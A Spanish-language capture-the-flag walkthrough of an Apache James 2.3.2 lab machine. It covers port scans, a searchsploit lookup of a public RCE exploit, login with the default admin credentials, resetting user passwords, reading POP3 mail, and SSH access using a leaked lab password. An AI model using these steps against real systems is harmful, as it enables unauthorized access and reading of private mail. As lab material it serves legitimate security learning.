### NMAP
```
nmap -p- -sT -T4 10.129.77.95
```
![](Pasted%20image%2020260119002155-1.png)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

Probamos a acceder al puerto 4555
```
http://10.129.77.95:4555/
```
![](Pasted%20image%2020260119003452-1.png)
Aparece un error pero aparece también el nombre del servicio que está corriendo
JAMES Remote Administration Tool 2.3.2

### GOBUSTER
```
gobuster dir -u http://10.129.77.95 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```
![](Pasted%20image%2020260119003646-1.png)
/images               (Status: 301) [Size: 313] [--> http://10.129.77.95/images/]
/assets               (Status: 301) [Size: 313] [--> http://10.129.77.95/assets/]
/server-status        (Status: 403) [Size: 300]

### SEARCHSPLOIT 
```
searchsploit JAMES
```
![](Pasted%20image%2020260119003908-1.png)
Probamos el RCE sin Metasploit
Apache James Server 2.3.2 - Remote Command Execution   | linux/remote/35513.py

```
locate 35513.py
sudo cp /usr/share/exploitdb/exploits/linux/remote/35513.py Downloads/
```
![](Pasted%20image%2020260119004053-1.png)
Al analizar el script observamos que las credenciales por defecto de JAMES son root/root
![](Pasted%20image%2020260119004159-1.png)
Probamos las credenciales por defecto en ssh
```
ssh root@10.129.77.95
```
![](Pasted%20image%2020260119012640-1.png)
Nos conectamos al servidor mediante telnet con las credenciales por defecto
```
telnet 10.129.77.95 4555
listusers
setpassword james a
```
![](Pasted%20image%2020260119005713-1.png)

Cambiamos la contraseña de los usuarios que aparecen
```
nc 10.129.77.95 4555
```
![](Pasted%20image%2020260119011057-1.png)
Aunque se hayan cambiado las contraseñas parece que los cambios no se han aplicado.
```
ssh james@10.129.77.95
```
![](Pasted%20image%2020260119011329-1.png)
Al conectarnos al puerto pop3 confirmamos que el cambio de contraseña se ha aplicado a nivel de correo
```
telnet 10.129.77.95 110
```
![](Pasted%20image%2020260119011547-1.png)
Al acceder como john observamos que tiene un correo en la bandeja de entrada
```
list
retr 1
```
![](Pasted%20image%2020260119012235-1.png)Accedemos como mindy y observamos un correo donde se le facilitan credenciales de acceso al servidor
```
list
retr 1
retr 2
```
![](Pasted%20image%2020260119012434-1.png)
username: mindy
pass: P@55W0rd1!2@

Probamos las credenciales y obtenemos acceso al servidor
```
ssh mindy@10.129.77.95
```
![](Pasted%20image%2020260119012537-1.png)
